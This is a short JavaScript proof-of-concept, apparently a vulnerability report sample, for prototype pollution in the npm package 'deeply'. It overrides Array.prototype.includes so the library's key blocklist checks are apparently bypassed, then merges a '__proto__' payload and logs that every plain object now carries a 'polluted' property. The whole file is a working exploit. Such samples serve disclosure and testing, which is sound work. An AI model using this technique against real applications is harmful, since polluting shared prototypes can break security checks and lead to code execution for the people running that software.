Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const mergeFn = require('deeply');
const payload = '{"__proto__": {"polluted": "yes"}}';
var obj = {};
console.log({}.polluted);
mergeFn({}, JSON.parse(payload));
console.log({}.polluted);